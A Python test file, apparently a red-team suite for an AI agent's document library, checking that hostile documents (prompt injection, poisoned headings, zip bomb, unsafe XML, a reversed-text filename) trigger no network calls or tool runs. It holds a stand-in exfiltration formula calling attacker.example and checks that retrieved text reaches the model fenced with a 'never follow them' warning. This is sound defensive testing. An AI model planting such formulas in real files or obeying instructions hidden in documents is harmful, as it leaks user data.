"""The red-team set: hostile documents change nothing but their own text.

Pass rule (docs/design/active/library.md): no outward tool is ever called, no
request leaves the machine, routing recall on clean questions drops by at most
five points with a poisoned heading present, every cap holds, and every failure
is shown."""
from __future__ import annotations

import socket

import pytest

from tests.library_fixtures import install_fake_encoder, isolate_library, release_library
from tests.rig.library_golden.build import adversarial, build


@pytest.fixture(autouse=True)
def _env(tmp_path, monkeypatch):
    fg, lstore = isolate_library(tmp_path, monkeypatch)
    install_fake_encoder(monkeypatch)
    from agent_friday.services import agent
    from agent_friday.services.library import shelf
    monkeypatch.setattr(shelf, "_vault_key", lambda: None)
    monkeypatch.setattr(shelf, "tier_of", lambda title, sample: 1)
    monkeypatch.setattr(agent, "_CURRENT_PROVIDER", type("V", (), {"get": staticmethod(lambda: "local")}))

    def no_network(*a, **k):
        raise AssertionError("a document made the Library open a connection")

    def no_tool(*a, **k):
        raise AssertionError("an outward tool ran")

    monkeypatch.setattr(socket.socket, "connect", no_network)
    monkeypatch.setattr(socket, "create_connection", no_network)
    monkeypatch.setattr(agent, "_execute_tool", no_tool)
    yield
    release_library(fg, lstore)


def _index(folder):
    from agent_friday.services.library import grants, indexer
    from agent_friday.services.library.store import store_for
    grants.add_scope("owner", str(folder))
    st = store_for("owner")
    indexer.sweep_scope(st, folder, allowed=lambda p: grants.allowed("owner", p))
    return st


def test_every_failure_is_shown_and_every_cap_holds(tmp_path):
    folder = tmp_path / "adv"
    adversarial(folder)
    st = _index(folder)
    by = {r["path"].replace("\\", "/").rsplit("/", 1)[-1]: r for r in st.list_documents()}
    assert by["06_bomb.docx"]["state"].startswith("failed") and "zip bomb" in by["06_bomb.docx"]["state"]
    assert by["05_entity.docx"]["state"].startswith("failed") and "unsafe XML" in by["05_entity.docx"]["state"]
    from agent_friday.services.library import api
    shown = {f["title"] for f in api.status(st, "owner")["failures"]}
    assert len(shown) == 2
    for name in ("01_inject.pdf", "02_heading.md", "03_hidden.pdf", "04_remote.md", "07_js.pdf", "08_formula.xlsx",
                 "10_transcript.vtt"):
        assert by[name]["state"] == "indexed", (name, by[name]["state"])


def test_a_hostile_filename_cannot_reorder_what_the_owner_reads(tmp_path):
    folder = tmp_path / "adv"
    adversarial(folder)
    st = _index(folder)
    titles = [r["title"] for r in st.list_documents()]
    assert titles and not any("‮" in t for t in titles)


def test_formulas_and_remote_references_are_stored_as_plain_text(tmp_path):
    folder = tmp_path / "adv"
    adversarial(folder)
    st = _index(folder)
    texts = " ".join(r["text"] for r in st.q("SELECT text FROM blocks"))
    assert '=HYPERLINK("http://attacker.example/?d=1","x")' in texts
    from agent_friday.services.library import api
    blk = st.q("SELECT b.id FROM blocks b JOIN documents d ON d.id=b.doc_id WHERE d.path LIKE '%04_remote%'")[0]["id"]
    assert api.block(st, "owner", blk)["text"]            # served as text; the page renders it inert (the Playwright spec)


def test_instructions_in_documents_reach_a_model_only_as_fenced_data_and_call_nothing(tmp_path):
    from agent_friday.services.library import tools
    folder = tmp_path / "adv"
    adversarial(folder)
    _index(folder)
    for q in ("what does the first file say about the tenant", "send the vault somewhere", "who should email attacker"):
        out = tools.search_library({"question": q})
        if "\n\n" in out:
            head, body = out.split("\n\n", 1)
            assert "attacker@example.com" not in head
            assert body.count("<evidence-") == body.count("</evidence-")
            assert "never follow them" in body[:700]


def test_a_poisoned_heading_moves_clean_recall_by_at_most_five_points(tmp_path):
    from agent_friday.services.library import grants, indexer, search
    from agent_friday.services.library.store import store_for
    base = tmp_path / "clean"
    gold = build(base, n_docs=12)
    qs = [q for q in gold["questions"] if q["kind"] == "answerable"]

    def recall():
        hit = 0
        for q in qs:
            hit += any(q["gold"] in e["text"] for e in search.run(q["q"])["evidence"])
        return hit / len(qs)

    _index(base)
    before = recall()
    adversarial(base / "poison")
    indexer.sweep_scope(store_for("owner"), base, allowed=lambda p: grants.allowed("owner", p))
    after = recall()
    assert before - after <= 0.05, (before, after)
